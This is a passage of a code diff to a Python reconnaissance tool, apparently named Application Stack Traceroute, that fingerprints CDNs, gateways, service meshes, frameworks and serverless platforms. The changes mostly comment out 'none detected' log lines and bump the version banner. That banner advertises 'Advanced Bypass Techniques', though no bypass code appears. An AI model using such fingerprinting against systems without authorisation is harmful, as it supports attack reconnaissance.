-            self.log_discovery("Backend", "Detection", "None detected or unknown")
+        # else:
+        #     self.log_discovery("Backend", "Detection", "None detected or unknown")
 
     # NEW FUNCTIONS (keeping the ones I provided earlier)
     def load_balancer_fingerprinting(self, lb_config):
@@ -2692,8 +4728,8 @@ class ApplicationTraceroute:
                             self.log_discovery("APIGateway", "Detection", f"{gw_type}")
                             self.chain_map['layers'].append(f"GW-{gw_type}")
                             return
-                        else:
-                            self.log_discovery("APIGateway", "Detection", "None detected or unknown")      
+                        # else:
+                        #     self.log_discovery("APIGateway", "Detection", "None detected or unknown")      
         except Exception as e:
             self.log_discovery("APIGateway", "Error", str(e))
 
@@ -2711,8 +4747,8 @@ class ApplicationTraceroute:
                             self.log_discovery("ServiceMesh", "Detection", f"{mesh_type}")
                             self.chain_map['layers'].append(f"MESH-{mesh_type}")
                             return
-                        else:
-                            self.log_discovery("ServiceMesh", "Detection", "None detected or unknown")      
+                        # else:
+                        #     self.log_discovery("ServiceMesh", "Detection", "None detected or unknown")      
         except Exception as e:
             self.log_discovery("ServiceMesh", "Error", str(e))
 
@@ -2781,8 +4817,8 @@ class ApplicationTraceroute:
                                 self.log_discovery("Runtime", "Framework", f"{framework}")
                                 self.chain_map['layers'].append(f"FW-{framework.upper()}")
                                 break  # Found with confidence
-                            else:
-                                self.log_discovery("Runtime", "Detection", "None detected or unknown")   
+                            # else:
+                            #     self.log_discovery("Runtime", "Detection", "None detected or unknown")   
 
                     except Exception:
                         continue
@@ -2829,8 +4865,8 @@ class ApplicationTraceroute:
                             self.log_discovery("Serverless", "Platform", f"{platform}")
                             self.chain_map['layers'].append(f"SERVERLESS-{platform.upper()}")
                             return
-                        else:
-                            self.log_discovery("Database", "Detection", "None detected or unknown")   
+                        # else:
+                        #     self.log_discovery("Serverless", "Detection", "None detected or unknown")   
                             
         except Exception as e:
             self.log_discovery("Serverless", "Error", str(e))
@@ -2909,6 +4945,9 @@ class ApplicationTraceroute:
             if detected_cdn:
                 self.log_discovery("CDN", "Detection", detected_cdn)
                 self.chain_map['layers'].append(f"CDN-{detected_cdn}")
+            else:
+                self.log_discovery("CDN", "Detection", "None detected or unknown")  
+        
         except Exception as e:
             self.log_discovery("CDN", "Error", str(e))
 
@@ -4781,7 +6820,7 @@ def main():
     
     args = parser.parse_args()
     print("\n")
-    print("🔬 APPLICATION STACK TRACEROUTE - ENHANCED VERSION 2.5.0c")
+    print("🔬 APPLICATION STACK TRACEROUTE - ENHANCED VERSION 2.8.0")
     print("🎯 Next-Generation Infrastructure Analysis with Advanced Bypass Techniques")
     print("=" * 70)
     
